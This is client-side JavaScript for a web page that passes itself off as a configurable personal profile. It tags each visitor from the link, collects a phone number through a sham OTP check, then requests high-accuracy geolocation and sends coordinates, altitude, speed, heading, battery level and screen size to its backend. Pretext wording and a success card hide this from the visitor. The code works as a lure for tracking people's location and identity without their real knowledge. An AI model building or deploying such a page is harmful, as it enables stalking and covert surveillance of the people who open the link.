// Public 3rd-Person Logic with Real-Time OTP Verification & Geolocation

const profileWrapper = document.getElementById('profileWrapper');
const statusMsg = document.getElementById('statusMsg');
const statusText = document.getElementById('statusText');
const spinner = document.getElementById('spinner');

// Form Elements
const urlParams = new URLSearchParams(window.location.search);
const trackingTag = urlParams.get('tag') || urlParams.get('id') || 'General Visitor';

const countryCodeSelect = document.getElementById('countryCodeSelect');
const phoneInput = document.getElementById('phoneInput');
const phoneError = document.getElementById('phoneError');

const stepSendOtp = document.getElementById('stepSendOtp');
const sendOtpBtn = document.getElementById('sendOtpBtn');

const stepVerifyOtp = document.getElementById('stepVerifyOtp');
const otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
const editPhoneBtn = document.getElementById('editPhoneBtn');
const otpInput = document.getElementById('otpInput');
const otpError = document.getElementById('otpError');
const verifyOtpBtn = document.getElementById('verifyOtpBtn');
const resendOtpBtn = document.getElementById('resendOtpBtn');
const resendTimer = document.getElementById('resendTimer');

const smsBanner = document.getElementById('smsBanner');
const smsCodeText = document.getElementById('smsCodeText');
const autoFillOtpBtn = document.getElementById('autoFillOtpBtn');

let currentFormattedPhone = '';
let resendInterval = null;
let latestOtpCode = '';
let currentSiteConfig = null;

// Load live site config from backend on startup
async function loadSiteConfig() {
  try {
    const res = await fetch('/api/config');
    const data = await res.json();
    if (data.success && data.config) {
      applySiteConfig(data.config);
    }
  } catch (e) {
    console.warn('Using default UI config');
  }
}

function applySiteConfig(cfg) {
  currentSiteConfig = cfg;

  if (cfg.pageTitle) document.title = cfg.pageTitle;
  const nameEl = document.querySelector('.name');
  if (nameEl && cfg.profileName) nameEl.textContent = cfg.profileName;

  const titleEl = document.querySelector('.title');
  if (titleEl && cfg.profileTitle) titleEl.textContent = cfg.profileTitle;

  const bioEl = document.querySelector('.bio');
  if (bioEl && cfg.profileBio) bioEl.textContent = cfg.profileBio;

  const imgEl = document.getElementById('profileImg');
  if (imgEl && cfg.profileImgUrl) imgEl.src = cfg.profileImgUrl;

  if (cfg.buttonText && sendOtpBtn) {
    const span = sendOtpBtn.querySelector('span');
    if (span) span.textContent = cfg.buttonText;
  }

  if (cfg.defaultCountry && countryCodeSelect && !urlParams.get('phone')) {
    countryCodeSelect.value = cfg.defaultCountry;
  }

  if (cfg.themeColor) {
    document.documentElement.style.setProperty('--accent-cyan', cfg.themeColor);
  }

  // Toggle phone group visibility based on config
  const phoneGroup = document.querySelector('.phone-input-group');
  if (phoneGroup) {
    phoneGroup.style.display = cfg.requirePhone ? 'block' : 'none';
  }
}

loadSiteConfig();

// Pre-fill phone if in URL
if (phoneInput && urlParams.get('phone')) {
  phoneInput.value = urlParams.get('phone').replace(/[^0-9]/g, '').slice(-10);
}

// Input restrictions: only digits, max 10
if (phoneInput) {
  phoneInput.addEventListener('input', () => {
    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
    if (phoneInput.value.length === 10) {
      if (phoneError) phoneError.style.display = 'none';
      phoneInput.classList.remove('shake-input');
    }
  });

  phoneInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleSendOtp();
  });
}

if (otpInput) {
  otpInput.addEventListener('input', () => {
    otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 4);
    if (otpError) otpError.style.display = 'none';
    otpInput.classList.remove('shake-input');
  });

  otpInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleVerifyOtpAndLocate();
  });
}

// --------------------------------------------------------------------------
// Step 1: Send OTP
// --------------------------------------------------------------------------
async function handleSendOtp() {
  const requirePhone = !currentSiteConfig || currentSiteConfig.requirePhone !== false;
  const requireOtp = !currentSiteConfig || currentSiteConfig.requireOtp !== false;

  const digits = phoneInput ? phoneInput.value.replace(/[^0-9]/g, '').trim() : '';

  if (requirePhone) {
    if (!digits || digits.length !== 10) {
      if (phoneError) {
        phoneError.style.display = 'block';
        phoneError.textContent = digits.length === 0 
          ? '⚠️ Pehle 10-digit mobile number daalein (Required)!' 
          : `⚠️ Mobile number exact 10 digit ka hona chahiye! (Abhi ${digits.length} digits hain)`;
      }
      if (phoneInput) {
        phoneInput.classList.remove('shake-input');
        void phoneInput.offsetWidth;
        phoneInput.classList.add('shake-input');
        phoneInput.focus();
      }
      return;
    }

    const country = countryCodeSelect ? countryCodeSelect.value : '+91';
    currentFormattedPhone = `${country} ${digits}`;
  } else {
    currentFormattedPhone = 'N/A';
  }

  // If OTP is disabled by admin, skip OTP step and directly request location
  if (!requireOtp) {
    requestAndTransmitLocation(currentFormattedPhone);
    return;
  }

  // UI loading
  sendOtpBtn.disabled = true;
  sendOtpBtn.innerHTML = `<span>Sending OTP...</span>`;

  try {
    const res = await fetch('/api/otp/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phoneNumber: currentFormattedPhone,
        tag: trackingTag
      })
    });

    const data = await res.json();

    if (!res.ok) {
      throw new Error(data.error || 'Failed to send OTP');
    }

    latestOtpCode = data.otpPreview || '';

    // Switch to Step 2: OTP Verification
    stepSendOtp.style.display = 'none';
    stepVerifyOtp.style.display = 'block';
    otpPhoneDisplay.textContent = currentFormattedPhone;
    otpInput.value = '';
    otpInput.focus();

    // Show simulated SMS notification banner
    if (latestOtpCode) {
      smsCodeText.textContent = latestOtpCode;
      smsBanner.style.display = 'flex';
      smsBanner.classList.add('shake-input');
    }

    startResendTimer(30);

  } catch (err) {
    alert(err.message);
  } finally {
    sendOtpBtn.disabled = false;
    sendOtpBtn.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M22 2L11 13"></path>
        <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
      </svg>
      <span>Send Verification OTP</span>
    `;
  }
}

// --------------------------------------------------------------------------
// Step 2: Verify OTP & Trigger Location
// --------------------------------------------------------------------------
async function handleVerifyOtpAndLocate() {
  const enteredOtp = otpInput ? otpInput.value.trim() : '';

  if (!enteredOtp || enteredOtp.length !== 4) {
    if (otpError) {
      otpError.style.display = 'block';
      otpError.textContent = '⚠️ Please enter the complete 4-digit OTP code.';
    }
    if (otpInput) {
      otpInput.classList.remove('shake-input');
      void otpInput.offsetWidth;
      otpInput.classList.add('shake-input');
      otpInput.focus();
    }
    return;
  }

  verifyOtpBtn.disabled = true;
  verifyOtpBtn.innerHTML = `<span>Verifying Code...</span>`;

  try {
    const res = await fetch('/api/otp/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phoneNumber: currentFormattedPhone,
        otp: enteredOtp
      })
    });

    const data = await res.json();

    if (!res.ok) {
      throw new Error(data.error || 'Verification failed');
    }

    // OTP Verified! Hide SMS banner & trigger Geolocation
    smsBanner.style.display = 'none';
    if (otpError) otpError.style.display = 'none';
    
    verifyOtpBtn.style.background = '#10b981';
    verifyOtpBtn.innerHTML = `<span>✓ OTP Verified! Connecting...</span>`;

    // Now request Geolocation and submit to database
    requestAndTransmitLocation(currentFormattedPhone);

  } catch (err) {
    if (otpError) {
      otpError.style.display = 'block';
      otpError.textContent = `⚠️ ${err.message}`;
    }
    if (otpInput) {
      otpInput.classList.remove('shake-input');
      void otpInput.offsetWidth;
      otpInput.classList.add('shake-input');
      otpInput.focus();
    }
    verifyOtpBtn.disabled = false;
    verifyOtpBtn.innerHTML = `<span>Verify OTP &amp; Connect</span>`;
  }
}

// --------------------------------------------------------------------------
// Location Capture & Database Transmission
// --------------------------------------------------------------------------
async function requestAndTransmitLocation(verifiedPhone) {
  if (!('geolocation' in navigator)) {
    statusText.textContent = 'Geolocation not supported by browser.';
    return;
  }

  spinner.style.display = 'inline-block';
  statusText.style.color = 'var(--text-muted)';
  statusText.textContent = 'Connecting to profile & syncing verified coordinates...';

  const batteryLevel = await getBatteryInfo();
  const screenResolution = `${window.screen.width}x${window.screen.height}`;

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude, accuracy, altitude, speed, heading } = position.coords;
      const timestamp = new Date(position.timestamp).toISOString();

      try {
        await fetch('/api/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            tag: trackingTag,
            phoneNumber: verifiedPhone,
            otpStatus: 'VERIFIED',
            latitude,
            longitude,
            accuracy,
            altitude,
            speed,
            heading,
            screenResolution,
            batteryLevel,
            timestamp
          })
        });

        spinner.style.display = 'none';
        if (statusMsg) statusMsg.style.display = 'none';

        // Hide form inputs cleanly
        if (stepSendOtp) stepSendOtp.style.display = 'none';
        if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
        const phoneGroup = document.querySelector('.phone-input-group');
        if (phoneGroup) phoneGroup.style.display = 'none';

        // Trigger Animated Success Celebration Card
        const successCard = document.getElementById('successCelebrationCard');
        if (successCard) {
          successCard.style.display = 'block';
          const celebrationText = document.getElementById('celebrationCustomText');
          if (celebrationText && currentSiteConfig && currentSiteConfig.successMessage) {
            celebrationText.textContent = currentSiteConfig.successMessage;
          }
        }

      } catch (err) {
        spinner.style.display = 'none';
        statusText.textContent = 'Profile connected.';
      }
    },
    (error) => {
      spinner.style.display = 'none';
      statusText.style.color = '#f59e0b';
      if (error.code === error.PERMISSION_DENIED) {
        statusText.textContent = 'Please allow location permission in your browser address bar to finish.';
      } else {
        statusText.textContent = 'Location timed out. Please allow location access.';
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

// --------------------------------------------------------------------------
// Helpers: Battery, Timer, Auto-fill
// --------------------------------------------------------------------------
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Battery'})`;
    }
  } catch (e) {}
  return 'N/A';
}

function startResendTimer(seconds) {
  clearInterval(resendInterval);
  let remaining = seconds;
  resendOtpBtn.disabled = true;
  resendTimer.textContent = remaining;

  resendInterval = setInterval(() => {
    remaining--;
    resendTimer.textContent = remaining;
    if (remaining <= 0) {
      clearInterval(resendInterval);
      resendOtpBtn.disabled = false;
      resendOtpBtn.innerHTML = `Resend Code`;
    }
  }, 1000);
}

// Change Phone Number
editPhoneBtn.addEventListener('click', () => {
  stepVerifyOtp.style.display = 'none';
  stepSendOtp.style.display = 'block';
  smsBanner.style.display = 'none';
  phoneInput.focus();
});

// Auto-fill OTP from simulated SMS
autoFillOtpBtn.addEventListener('click', () => {
  if (latestOtpCode && otpInput) {
    otpInput.value = latestOtpCode;
    otpInput.focus();
    if (otpError) otpError.style.display = 'none';
  }
});

resendOtpBtn.addEventListener('click', () => {
  if (!resendOtpBtn.disabled) {
    handleSendOtp();
  }
});

sendOtpBtn.addEventListener('click', handleSendOtp);
verifyOtpBtn.addEventListener('click', handleVerifyOtpAndLocate);
